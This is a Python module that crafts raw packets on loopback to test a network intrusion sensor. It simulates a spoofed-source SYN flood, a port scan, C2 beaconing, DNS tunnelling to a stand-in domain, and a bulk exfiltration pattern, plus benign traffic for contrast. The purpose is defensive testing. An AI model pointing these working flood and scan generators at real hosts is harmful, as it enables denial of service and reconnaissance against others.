"""Real attack traffic, on the wire.

This is not a mock feed. Each generator crafts genuine IPv4/TCP/UDP packets and
sends them on the loopback interface, where the live sensor captures and
classifies them exactly as it would attacker traffic on a production tap. It is
how we demonstrate — and test — the whole path end to end: an attack happens,
real packets travel, the sensor detects it, the browser lights up.

Spoofed-source floods and low-level flag control need raw sockets, so this
needs CAP_NET_RAW (root). It targets 127.0.0.0/8 only: the packets never leave
the host, so this is a self-contained range for a demo, not a tool aimed at
anyone. `available()` says whether the host can run it.

None of this is in the detection path. The sensor has no idea these packets were
generated rather than sniffed off a hostile network — which is the point.
"""
from __future__ import annotations

import random
import socket
import struct
import threading
import time

TCP_FIN, TCP_SYN, TCP_RST, TCP_PSH, TCP_ACK = 0x01, 0x02, 0x04, 0x08, 0x10


def available() -> tuple[bool, str]:
    if not hasattr(socket, "AF_PACKET"):
        return False, "raw packet injection is Linux-only"
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
        s.close()
        return True, "raw injection available"
    except PermissionError:
        return False, "need CAP_NET_RAW to craft packets"
    except OSError as exc:
        return False, str(exc)


# =============================================================================
# packet crafting
# =============================================================================
def _checksum(data: bytes) -> int:
    if len(data) % 2:
        data += b"\x00"
    s = sum(struct.unpack("!%dH" % (len(data) // 2), data))
    s = (s >> 16) + (s & 0xFFFF)
    s += s >> 16
    return (~s) & 0xFFFF


def ip_header(src: str, dst: str, proto: int, payload_len: int, ident: int) -> bytes:
    total = 20 + payload_len
    hdr = struct.pack("!BBHHHBBH4s4s", 0x45, 0, total, ident & 0xFFFF, 0x4000,
                      64, proto, 0, socket.inet_aton(src), socket.inet_aton(dst))
    return hdr[:10] + struct.pack("!H", _checksum(hdr)) + hdr[12:]


def tcp_header(src: str, dst: str, sport: int, dport: int, flags: int,
               seq: int = 0, payload: bytes = b"") -> bytes:
    off = (5 << 4)
    hdr = struct.pack("!HHIIBBHHH", sport, dport, seq, 0, off, flags, 65535, 0, 0)
    pseudo = struct.pack("!4s4sBBH", socket.inet_aton(src), socket.inet_aton(dst),
                         0, socket.IPPROTO_TCP, len(hdr) + len(payload))
    csum = _checksum(pseudo + hdr + payload)
    hdr = hdr[:16] + struct.pack("!H", csum) + hdr[18:]
    return hdr + payload


def udp_header(src: str, dst: str, sport: int, dport: int, payload: bytes) -> bytes:
    length = 8 + len(payload)
    hdr = struct.pack("!HHHH", sport, dport, length, 0)
    pseudo = struct.pack("!4s4sBBH", socket.inet_aton(src), socket.inet_aton(dst),
                         0, socket.IPPROTO_UDP, length)
    csum = _checksum(pseudo + hdr + payload) or 0xFFFF
    return struct.pack("!HHHH", sport, dport, length, csum) + payload


class _Raw:
    """A raw IPv4 sender (IP_HDRINCL) — lets us set the source and TCP flags."""

    def __init__(self):
        self.s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
        self.s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
        self._id = random.randrange(65536)

    def send(self, src: str, dst: str, proto: int, l4: bytes) -> None:
        self._id = (self._id + 1) & 0xFFFF
        pkt = ip_header(src, dst, proto, len(l4), self._id) + l4
        try:
            self.s.sendto(pkt, (dst, 0))
        except OSError:
            pass

    def close(self):
        self.s.close()


# =============================================================================
# attacks — each emits a burst of real packets
# =============================================================================
def _dns_qname(name: str) -> bytes:
    out = b""
    for label in name.split("."):
        out += bytes([len(label)]) + label.encode()[:63]
    return out + b"\x00"


def dns_query(txid: int, qname: str, qtype: int = 16) -> bytes:
    return (struct.pack("!HHHHHH", txid, 0x0100, 1, 0, 0, 0)
            + _dns_qname(qname) + struct.pack("!HH", qtype, 1))


ATTACKS = ("syn_flood", "port_scan", "c2_beacon", "dns_tunnel", "exfil")


def syn_flood(raw: _Raw, target: str = "127.0.0.1", port: int = 80,
              n: int = 600) -> int:
    """Spoofed-source SYN flood — the volumetric-DDoS signature (high source entropy)."""
    for _ in range(n):
        src = f"127.{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}"
        raw.send(src, target, socket.IPPROTO_TCP,
                 tcp_header(src, target, random.randint(1024, 65535), port, TCP_SYN))
    return n


def port_scan(raw: _Raw, target: str = "127.0.0.1", src: str = "127.0.0.9",
              ports=range(1, 401)) -> int:
    """One source, many ports, SYN only — recon fan-out."""
    n = 0
    for p in ports:
        raw.send(src, target, socket.IPPROTO_TCP,
                 tcp_header(src, target, 40000 + (p % 2000), p, TCP_SYN))
        n += 1
    return n


def c2_beacon(raw: _Raw, target: str = "127.0.0.77", src: str = "127.0.0.11",
              beats: int = 8, interval: float = 1.0, jitter: float = 0.15) -> int:
    """Regular callbacks to one host — C2 beaconing timing signature."""
    n = 0
    for _ in range(beats):
        raw.send(src, target, socket.IPPROTO_TCP,
                 tcp_header(src, target, 51000, 443, TCP_SYN))
        raw.send(target, src, socket.IPPROTO_TCP,
                 tcp_header(target, src, 443, 51000, TCP_SYN | TCP_ACK))
        raw.send(src, target, socket.IPPROTO_TCP,
                 tcp_header(src, target, 51000, 443, TCP_PSH | TCP_ACK, payload=b"\x16\x03\x01" + b"\x00" * 60))
        n += 3
        time.sleep(max(0.05, interval * (1 + random.uniform(-jitter, jitter))))
    return n


def dns_tunnel(raw: _Raw, resolver: str = "127.0.0.53", src: str = "127.0.0.23",
               n: int = 60) -> int:
    """Long, high-entropy subdomains to one resolver — DNS tunnelling."""
    for i in range(n):
        sub = "".join(random.choice("0123456789abcdef") for _ in range(45))
        q = dns_query(random.randrange(65536), f"{sub}.exfil-c2.net", qtype=16)
        raw.send(src, resolver, socket.IPPROTO_UDP,
                 udp_header(src, resolver, random.randint(1024, 65535), 53, q))
    return n


def exfil(raw: _Raw, target: str = "127.0.0.200", src: str = "127.0.0.8",
          chunks: int = 400) -> int:
    """Large asymmetric outbound transfer — data exfiltration."""
    seq = 1
    raw.send(src, target, socket.IPPROTO_TCP, tcp_header(src, target, 52000, 443, TCP_SYN, seq))
    raw.send(target, src, socket.IPPROTO_TCP, tcp_header(target, src, 443, 52000, TCP_SYN | TCP_ACK))
    body = bytes(random.getrandbits(8) for _ in range(1400))
    for _ in range(chunks):
        raw.send(src, target, socket.IPPROTO_TCP,
                 tcp_header(src, target, 52000, 443, TCP_PSH | TCP_ACK, seq, body))
        seq += len(body)
    raw.send(target, src, socket.IPPROTO_TCP,
             tcp_header(target, src, 443, 52000, TCP_PSH | TCP_ACK, payload=b"ok"))
    return chunks + 3


def benign(raw: _Raw, n: int = 40) -> int:
    """Ordinary web-like traffic, so the sensor has negatives to reject."""
    total = 0
    for _ in range(n):
        src = f"127.0.1.{random.randint(2,254)}"
        dst = "127.0.0.80"
        sp = random.randint(1024, 65535)
        raw.send(src, dst, socket.IPPROTO_TCP, tcp_header(src, dst, sp, 443, TCP_SYN))
        raw.send(dst, src, socket.IPPROTO_TCP, tcp_header(dst, src, 443, sp, TCP_SYN | TCP_ACK))
        raw.send(src, dst, socket.IPPROTO_TCP, tcp_header(src, dst, sp, 443, TCP_ACK))
        raw.send(src, dst, socket.IPPROTO_TCP, tcp_header(src, dst, sp, 443, TCP_FIN | TCP_ACK))
        total += 4
    return total


_DISPATCH = {"syn_flood": syn_flood, "port_scan": port_scan, "c2_beacon": c2_beacon,
             "dns_tunnel": dns_tunnel, "exfil": exfil, "benign": benign}


def launch(name: str) -> int:
    """Fire one named attack once. Returns packets sent."""
    ok, _ = available()
    if not ok:
        return 0
    raw = _Raw()
    try:
        fn = _DISPATCH.get(name)
        return fn(raw) if fn else 0
    finally:
        raw.close()


def launch_async(name: str) -> threading.Thread:
    t = threading.Thread(target=launch, args=(name,), daemon=True)
    t.start()
    return t
